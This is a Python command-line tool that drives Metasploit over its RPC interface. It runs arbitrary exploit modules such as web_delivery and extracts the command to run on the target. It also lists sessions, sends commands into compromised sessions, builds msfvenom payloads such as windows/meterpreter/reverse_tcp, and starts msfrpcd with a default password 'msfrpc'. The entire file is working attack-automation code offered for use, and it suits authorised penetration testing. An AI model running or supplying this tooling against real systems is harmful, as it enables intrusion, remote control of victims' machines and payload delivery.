import argparse
import configparser
import re
import time
import logging
import subprocess
from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError


# Load configuration from config.ini
def load_config(config_file, section):
    config = configparser.ConfigParser()
    config.read(config_file)
    return dict(config.items(section)) if config.has_section(section) else {}


# Parse the arguments and load from config.ini if necessary
def parse_arguments(config):
    parser = argparse.ArgumentParser(description='Metasploit Tool with Multiple Functionalities.')

    subparsers = parser.add_subparsers(dest='command', help='Choose a functionality to use')

    # Functionality 1: Run Metasploit module
    run_parser = subparsers.add_parser('run_module', help='Run any Metasploit module and get its output.')
    run_parser.add_argument('module', help='The Metasploit module to use (e.g., exploit/multi/script/web_delivery).')
    run_parser.add_argument('--option', action='append', help='Module options in the form OPTION=VALUE.', required=True)
    run_parser.add_argument('--regex', help='Regex pattern to filter output.', default=config.get('regex', r"Run the following command on the target machine:\n(.*)"))
    run_parser.add_argument('--msf-password', help='The password for the Metasploit RPC server.', default=config.get('msf_password', 'msfrpc'))
    run_parser.add_argument('--rpc-server', help='The Metasploit RPC server address.', default=config.get('rpc_server', '127.0.0.1'))
    run_parser.add_argument('--rpc-port', help='The Metasploit RPC server port.', type=int, default=int(config.get('rpc_port', 55552)))
    run_parser.add_argument('--rpc-ssl', action='store_true', help='Use SSL for RPC connection.')

    # Get jobs
    jobs_parser = subparsers.add_parser('get_jobs', help='Poll the active Metasploit jobs.')
    jobs_parser.add_argument('--msf-password', help='The password for the Metasploit RPC server.', default=config.get('msf_password', 'msfrpc'))
    jobs_parser.add_argument('--rpc-server', help='The Metasploit RPC server address.', default=config.get('rpc_server', '127.0.0.1'))
    jobs_parser.add_argument('--rpc-port', help='The Metasploit RPC server port.', type=int, default=int(config.get('rpc_port', 55552)))
    jobs_parser.add_argument('--rpc-ssl', action='store_true', help='Use SSL for RPC connection.')

    # Get sessions
    sessions_parser = subparsers.add_parser('get_sessions', help='Poll the active Metasploit sessions.')
    sessions_parser.add_argument('--msf-password', help='The password for the Metasploit RPC server.', default=config.get('msf_password', 'msfrpc'))
    sessions_parser.add_argument('--rpc-server', help='The Metasploit RPC server address.', default=config.get('rpc_server', '127.0.0.1'))
    sessions_parser.add_argument('--rpc-port', help='The Metasploit RPC server port.', type=int, default=int(config.get('rpc_port', 55552)))
    sessions_parser.add_argument('--rpc-ssl', action='store_true', help='Use SSL for RPC connection.')

    # Access session and run command
    access_parser = subparsers.add_parser('run_command', help='Access a Metasploit session and run a command.')
    access_parser.add_argument('session_id', help='The ID of the session to access.')
    access_parser.add_argument('session_command', help='The command to run in the session.')
    access_parser.add_argument('--msf-password', help='The password for the Metasploit RPC server.', default=config.get('msf_password', 'msfrpc'))
    access_parser.add_argument('--rpc-server', help='The Metasploit RPC server address.', default=config.get('rpc_server', '127.0.0.1'))
    access_parser.add_argument('--rpc-port', help='The Metasploit RPC server port.', type=int, default=int(config.get('rpc_port', 55552)))
    access_parser.add_argument('--rpc-ssl', action='store_true', help='Use SSL for RPC connection.')

    # Generate payload
    venom_parser = subparsers.add_parser('generate_payload', help='Generate a payload using msfvenom.')
    venom_parser.add_argument('format', help='The output format of the payload (e.g., exe, elf, raw).')
    venom_parser.add_argument('payload', help='The payload to generate (e.g., windows/meterpreter/reverse_tcp).')
    venom_parser.add_argument('lhost', help='The local host IP for the payload.')
    venom_parser.add_argument('lport', help='The local port for the payload.')
    venom_parser.add_argument('output_file', help='The file to save the generated payload to.')

    # Start RPC Server
    rpc_parser = subparsers.add_parser('start_rpc', help='Start the Metasploit RPC server.')
    rpc_parser.add_argument('--rpc-user', help='Username for the RPC server.', default='msf')
    rpc_parser.add_argument('--rpc-password', help='Password for the RPC server.', default='msfrpc')
    rpc_parser.add_argument('--rpc-port', help='Port for the RPC server.', type=int, default=55552)


    return parser.parse_args()


# Core functions
# Functionality 1: Run any Metasploit module
def run_exploit(client, module_name, options, regex=None):
    try:
        console = client.consoles.console()
        logging.info(f"Created a new console with ID: {console.cid}")

        logging.info(f"Using module: {module_name}")
        console.write(f'use {module_name}\n')

        for option, value in options.items():
            logging.info(f"Setting option: {option} = {value}")
            console.write(f'set {option} {value}\n')

        logging.info("Running the exploit...")
        console.write('run -j\n')

        time.sleep(3)
        output = console.read()['data']

        if regex:
            logging.info(f"Filtering output with regex: {regex}")
            matches = re.findall(regex, output, re.DOTALL)
            output = "\n".join(matches)

        logging.info("Exploit run completed. Output:")
        print(output)

        return output

    except MsfRpcError as e:
        logging.error(f"Metasploit RPC error: {e}")
        return None
    except Exception as e:
        logging.error(f"An unexpected error occurred: {e}")
        return None
    
# Functionality to start the RPC server
# TODO rpc_user 
def start_rpc_server(rpc_password, rpc_port):
    try:
        # Command to start Metasploit RPC server
        command = ['msfrpcd', '-P', rpc_password, '-p', str(rpc_port), '-S']
        logging.info(f"Starting Metasploit RPC server with command: {' '.join(command)}")
        subprocess.run(command, check=True)
        logging.info("Metasploit RPC server started successfully.")
    except subprocess.CalledProcessError as e:
        logging.error(f"Failed to start Metasploit RPC server: {e}")


# Functionality 2: Poll active jobs
def get_jobs(client):
    jobs = client.jobs.list
    if jobs:
        logging.info(f"Active jobs: {jobs}")
    else:
        logging.info("No active jobs.")
    return jobs


# Functionality 3: Poll active sessions
def get_sessions(client):
    sessions = client.sessions.list
    if sessions:
        logging.info(f"Active sessions: {sessions}")
    else:
        logging.info("No active sessions.")
    return sessions

# Functionality 4: Access session and run command
def access_session(client, session_id, command):
    try:
        logging.info(f"Session ID: {session_id}, Command: {command}") 
        session = client.sessions.session(session_id)
        logging.debug(f"Accessing session {session}")
        session.write(command)
        time.sleep(3) 
        result = session.read()
        logging.debug(f"Command result: {result}")
        return result
    except MsfRpcError as e:
        logging.error(f"Error accessing session {session_id}: {e}")
        return None

# Functionality 5: Generate a payload with msfvenom
def generate_payload(format, payload, lhost, lport, output_file):
    try:
        command = ['msfvenom', '-p', payload, f'LHOST={lhost}', f'LPORT={lport}', '-f', format, '-o', output_file]
        logging.info(f"Running msfvenom: {' '.join(command)}")
        subprocess.run(command, check=True)
        logging.info(f"Payload saved to {output_file}")
    except subprocess.CalledProcessError as e:
        logging.error(f"msfvenom error: {e}")
        
        
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    # Load configuration
    config_file = 'config.ini'
    config = load_config(config_file, 'default')

    # Parse arguments with config overrides
    args = parse_arguments(config)

    if args.command == 'start_rpc':
        start_rpc_server(args.rpc_password, args.rpc_port)

    else:
        client = MsfRpcClient(args.msf_password, server=args.rpc_server, port=args.rpc_port, ssl=args.rpc_ssl)

        if args.command == 'run_module':
            options = {}
            for opt in args.option:
                key, value = opt.split('=', 1)
                options[key.strip()] = value.strip()
            run_exploit(client, args.module, options, args.regex)

        elif args.command == 'get_jobs':
            get_jobs(client)

        elif args.command == 'get_sessions':
            get_sessions(client)

        elif args.command == 'run_command':
            access_session(client, args.session_id, args.session_command)

        elif args.command == 'generate_payload':
            generate_payload(args.format, args.payload, args.lhost, args.lport, args.output_file)